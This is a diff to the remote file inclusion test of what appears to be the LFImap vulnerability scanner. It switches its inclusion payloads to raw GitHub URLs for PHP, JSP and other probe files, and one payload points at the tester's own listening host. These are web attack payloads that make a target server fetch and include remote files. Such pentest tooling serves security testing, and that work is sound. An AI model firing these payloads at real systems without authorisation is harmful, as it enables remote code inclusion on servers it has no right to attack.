@@ -2,6 +2,7 @@
 import os
 import threading
 import fileinput
+import urllib
 from random import randint
 
 from src.httpreqs import request
@@ -49,6 +50,7 @@ def test_rfi(url, post):
 
             threading.Thread(target=serve_forever).start()
             rfiTest = []
+
             rfiTest.append(
                 f"http%3A%2F%2F{args['lhost']}%3A{rfi_test_port}%2Fysvznc"
             )
@@ -89,21 +91,23 @@ def test_rfi(url, post):
     if args['verbose']:
         print(colors.blue("[i]") + " Trying to include internet-hosted file...", flush = True)
 
+    base_uri = "https://raw.githubusercontent.com/hansmach1ne/LFImap/main/src/exploits/"
+
     pylds = []
     pylds.append(
-        "https%3A%2F%2Fgithub.com%2Fhansmach1ne%2FLFImap%2Fblob%2Fmain%2Fsrc%2Fexploits%2Fexploit.php"
+        urllib.parse.quote_plus(f"{base_uri}ysvznc.php")
     )
     pylds.append(
-        "https%3A%2F%2Fgithub.com%2Fhansmach1ne%2FLFImap%2Fblob%2Fmain%2Fsrc%2Fexploits%2Fexploit.jsp"
+        urllib.parse.quote_plus(f"{base_uri}ysvznc.jsp")
     )
     pylds.append(
-        "https%3A%2F%2Fgithub.com%2Fhansmach1ne%2FLFImap%2Fblob%2Fmain%2Fsrc%2Fexploits%2Fexploit.html"
+        urllib.parse.quote_plus(f"{base_uri}ysvznc.html")
     )
     pylds.append(
-        "https%3A%2F%2Fgithub.com%2Fhansmach1ne%2FLFImap%2Fblob%2Fmain%2Fsrc%2Fexploits%2Fexploit.gif"
+        urllib.parse.quote_plus(f"{base_uri}ysvznc.gif")
     )
     pylds.append(
-        "https%3A%2F%2Fgithub.com%2Fhansmach1ne%2FLFImap%2Fblob%2Fmain%2Fsrc%2Fexploits%2Fexploit.png"
+        urllib.parse.quote_plus(f"{base_uri}ysvznc.png")
     )
 
     if args['callback']:
